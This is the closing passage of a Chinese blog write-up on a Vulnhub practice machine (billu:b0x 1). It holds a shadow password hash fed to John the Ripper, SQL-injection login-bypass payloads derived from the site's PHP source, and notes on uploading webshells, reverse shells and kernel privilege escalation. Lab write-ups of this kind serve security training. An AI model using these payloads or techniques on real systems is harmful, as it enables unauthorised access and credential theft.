+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ica:$6$yAfsVVEV$UMXZ7KKc2Xhk6tTukMl.QkFN34d&#x2F;PLRtKYZCFZzZKFyym3uzhVcWongiw1RIFtGJQyJL2a8vAwG13VHijFbzM.:17244:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>用这一串去john解密，新建一个文本文件，将上面一大串放进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt </span><br></pre></td></tr></table></figure>
+
+<p>开始漫长的等待</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$WE&#x2F;VCmzAPSKCKqZa$AXsu5TzeLu2Qb6a8xxrqREjppbx6nIuZ2BflCDY3DsfuguW.cifkkC4b3FQk5vO7kCnSyOfLY6NoQQUwoA&#x2F;zr.</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sql绕过"><a href="#sql绕过" class="headerlink" title="sql绕过"></a>sql绕过</h2><p>绕过是网上学来的方法，先获取源码代码审计</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;un&#39;]));</span><br><span class="line">$pass&#x3D;str_replace(&#39;\&#39;&#39;,&#39;&#39;,urldecode($_POST[&#39;ps&#39;]));</span><br><span class="line">$run&#x3D;&#39;select * from auth where  pass&#x3D;\&#39;&#39;.$pass.&#39;\&#39; and uname&#x3D;\&#39;&#39;.$uname.&#39;\&#39;&#39;;</span><br><span class="line">$result &#x3D; mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure>
+
+<p>sql注入一个重要的原则就是闭合输入查询，str_replace的作用是将字符串’ 替换为空，因此构造SQL注入登录payload时，必须含有’字符串，urldecode的作用是将输入解码。</p>
+<p>构造sql注入语句闭合绕过登录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;or 1&#x3D;1-- -\&#39;</span><br><span class="line">&#39;or 1&#x3D;1--+\&#39;  </span><br><span class="line">&#39;or 1&#x3D;1#\&#39;</span><br></pre></td></tr></table></figure>
+
+<p>用payload：<code>&#39;or 1=1-- -\&#39;</code> 成功绕过登录，就进入到panel.php页面了</p>
+<blockquote>
+<p>用户名和密码都要输入payload才能绕过，上面这三种代码都可以</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210108143100245.png" alt="image-20210108143100245"></p>
+<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul>
+<li>sql注入不知道怎么绕过，即使是有了源码，代码审计还是不太会绕</li>
+<li>扫描目录发现了一个很好用的工具dirb, 字典位置：/usr/share/dirb/wordlists</li>
+<li>文件包含如果get不行，就换post试一试</li>
+<li>phpmyadmin会伴随一个config.inc.php文件</li>
+<li>phpinfo信息可以查看能否文件上传、文件包含、还有网站的根目录在哪</li>
+<li>文件上传如果是上传图片马，必须要有文件包含读取可以解析文件的url才能菜刀连接，但是GET形式无法包含成功，那就上传一个可以命令执行的cmd马，然后后采用hackbar或者burp进行POST写入一句话文件，再菜刀连接</li>
+<li>kali中searchsploit搜索到的exp文件路径在<code>/usr/share/exploitdb/exploits/...</code>下</li>
+<li>反弹shell之后，如果是普通用户要进行提权，可以用 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> 网站直接搜，也可以用<code>searchsploit</code>命令搜，我还是觉得网站搜索更方便，直接点击下载</li>
+<li>出现错误 sh:0:can’t access tty;job control turned off错误意味着没有/bin/bash环境，要手动添加环境 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
+<li>getshell的方法有很多，能反弹shell就优先反弹，用菜刀连接的终端环境可能会有很多的限制，不利于提权，迫不得已先菜刀再反弹shell也行</li>
+<li>同一操作多看一些人的文章可以获取到新的知识</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/n5xxxx__zy/article/details/97020213">https://blog.csdn.net/n5xxxx__zy/article/details/97020213</a></p>
+<p><a target="_blank" rel="noopener" href="https://101.132.145.96/25435.html">https://101.132.145.96/25435.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a7f61bbd862">https://www.jianshu.com/p/2a7f61bbd862</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VfIwnb81_8PxL6mu6InzIQ">https://mp.weixin.qq.com/s/VfIwnb81_8PxL6mu6InzIQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://101.132.145.96/25435.html">https://101.132.145.96/25435.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">dummersoul</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dummersoul.github.io/2023/11/28/billu%20b0x_1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">https://dummersoul.github.io/2023/11/28/billu b0x_1靶机练习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dummersoul.github.io" target="_blank">dummersoul's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/">内网提权</a></div><div class="post_share"><div class="social-share" data-image="/img/luffy_shanks.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/28/billu%20b0x_2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><img class="prev-cover" src="/img/drupal.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">billu:b0x_2靶机练习</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/28/ATT&amp;CK%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><img class="next-cover" src="https://s2.loli.net/2022/10/21/svVaUy1XF3Tn7iu.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ATT&amp;CK（一）靶场练习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/28/KB-VULN1靶机练习/" title="KB-VULN：1靶机练习"><img class="cover" src="/img/vulnhub.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">KB-VULN：1靶机练习</div></div></a></div><div><a href="/2023/11/28/KB-VULN2靶机练习/" title="KB-VULN：2靶机练习"><img class="cover" src="/img/vulnhub.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">KB-VULN：2靶机练习</div></div></a></div><div><a href="/2023/11/28/billu b0x_2靶机练习/" title="billu:b0x_2靶机练习"><img class="cover" src="/img/drupal.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">billu:b0x_2靶机练习</div></div></a></div><div><a href="/2023/11/28/djinn-1靶机练习/" title="djinn-1靶机练习"><img class="cover" src="/img/djinn1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">djinn-1靶机练习</div></div></a></div><div><a href="/2023/11/28/vulnhub djinn3/" title="vulnhub djinn-3 writeup"><img class="cover" src="/img/Werkzeug.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">vulnhub djinn-3 writeup</div></div></a></div><div><a href="/2023/11/28/djinn-2靶机练习/" title="djinn-2靶机练习"><img class="cover" src="/img/keepass.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">djinn-2靶机练习</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">dummersoul</div><div class="author-info__description">网络安全从业者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dummersoul"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dummersoul" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dummersoul@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到dummersoul的技术小窝</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95%E2%80%93dirb"><span class="toc-number">4.</span> <span class="toc-text">扫描目录–dirb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E9%92%88%E4%BF%A1%E6%81%AF"><span class="toc-number">5.</span> <span class="toc-text">探针信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin"><span class="toc-number">7.</span> <span class="toc-text">phpmyadmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">8.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">9.</span> <span class="toc-text">bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%88%80%E5%BC%B9shell"><span class="toc-number">10.</span> <span class="toc-text">菜刀弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-getshell%E5%90%8E%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">nc getshell后提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">11.1.</span> <span class="toc-text">内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2exp"><span class="toc-number">11.1.1.</span> <span class="toc-text">搜索exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cexp"><span class="toc-number">11.1.2.</span> <span class="toc-text">执行exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%88%80%E4%B8%8B%E6%8F%90%E6%9D%83"><span class="toc-number">12.</span> <span class="toc-text">菜刀下提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">13.</span> <span class="toc-text">msf反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#config-inc-php"><span class="toc-number">14.</span> <span class="toc-text">config.inc.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin%E5%88%B0getshell"><span class="toc-number">15.</span> <span class="toc-text">phpmyadmin到getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc-shadow%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">16.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow解密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E7%BB%95%E8%BF%87"><span class="toc-number">17.</span> <span class="toc-text">sql绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E6%80%BB%E7%BB%93"><span class="toc-number">18.</span> <span class="toc-text">思考总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">19.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现"><img src="https://techterms.com/img/sm/cve_1618.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-42550漏洞复现"/></a><div class="content"><a class="title" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现">CVE-2021-42550漏洞复现</a><time datetime="2024-03-10T06:54:43.353Z" title="发表于 2024-03-10 14:54:43">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss"><img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*WwN78iOX-HC74T9AHGxjOg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="webview intent uxss"/></a><div class="content"><a class="title" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss">webview intent uxss</a><time datetime="2024-03-10T06:54:17.108Z" title="发表于 2024-03-10 14:54:17">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析"><img src="https://picx.zhimg.com/70/v2-fd69dc15d82e0d4b54cfba25e7e15443_1440w.avis?source=172ae18b&amp;biz_tag=Post" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于Tomcat的内存马分析"/></a><div class="content"><a class="title" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析">基于Tomcat的内存马分析</a><time datetime="2024-03-10T06:53:39.202Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构"><img src="https://images.ytao.top/tomcat.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat架构"/></a><div class="content"><a class="title" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构">Tomcat架构</a><time datetime="2024-03-10T06:53:39.200Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构"><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20211201164619.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一文搞懂DEX文件结构"/></a><div class="content"><a class="title" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构">一文搞懂DEX文件结构</a><time datetime="2023-11-28T08:48:58.520Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 <i id="heartbeat" class="fa fas fa-heartbeat"></i> dummersoul</div><div class="framework-info"><!--span= _p('footer.framework') + ' '--><!--a(href='https://hexo.io')= 'Hexo'--><!--span.footer-separator |--><!--span= _p('footer.theme') + ' '--><!--a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'--></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  let setting = {
+    appId: '',
+    appKey: '',
+  }
+
+  if (false) {
+    const otherSetting = false
+    setting = Object.assign({}, setting, otherSetting)
+  }
+
+  const init = () => {
+    new Artitalk(setting)
+  }
+
+  if (typeof Artitalk === 'function') {
+    init()
+  } else {
+    $.getScript('https://cdn.jsdelivr.net/npm/artitalk',init)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'n3p3uLQDNt0AhK7HstJIX6hw-gzGzoHsz',
+      appKey: 'DzduWleTzfwsWV48PWO1wi1d',
+      placeholder: '留下你的昵称和邮箱，可以快速得到回复哦~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '//i0.hdslb.com/bfs/emote/',
+      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_亲亲":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再见":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_发怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_发财":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可爱":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_呕吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_坏笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尴尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_惊吓":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/third-party/switch_comments.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script src="//code.tidio.co/cqinyzbakrsti8bz4wjlaffn3gkjplgj.js" async="async"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
